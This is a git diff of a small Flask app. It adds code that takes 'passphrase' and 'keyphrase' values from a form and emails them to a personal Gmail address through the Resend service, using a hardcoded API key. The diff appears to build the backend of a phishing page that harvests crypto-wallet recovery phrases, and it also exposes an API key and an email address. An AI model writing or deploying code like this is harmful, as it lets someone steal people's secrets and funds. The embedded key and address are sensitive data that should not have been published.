@@ -1,25 +1,35 @@
 from flask import Flask, request, redirect, url_for
 
-#passphrase
-#keyphrase
+import resend
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route("/")
 def home():
-    return redirect(url_for('server'))
+    return redirect(url_for("server"))
 
-@app.route('/submit', methods = ["GET", "POST"])
+API_KEY = "re_4jT9uMnR_FpBgpk5cEj3bCLQ1kmCc3GZV"
+
+@app.route("/submit", methods = ["GET", "POST"])
 def server():
-    if request.method == 'GET':
-        return 'Server Page'
+    if request.method == "GET":
+        return "Server Page"
     
     else:
-        pass_phrase = request.form.get('passphrase')
+        pass_phrase = request.form.get("passphrase")
 
-        key_phrase = request.form.get('keyphrase')
+        key_phrase = request.form.get("keyphrase")
 
-        return f'<p>{pass_phrase}</p><p>{key_phrase}</p>'
+        resend.api_key = API_KEY
 
-if __name__ == '__main__':
+        response = resend.Emails.send({
+        "from": "onboarding@resend.dev",
+        "to": "ichekingsley@gmail.com",
+        "subject": "New Response",
+        "text": f"Passphrase: {pass_phrase}\nKey Phrase: {key_phrase}\n Ignore this message if you have not requested the above."
+        })
+
+        return "Your email is on the way"
+
+if __name__ == "__main__":
     app.run(debug = True)
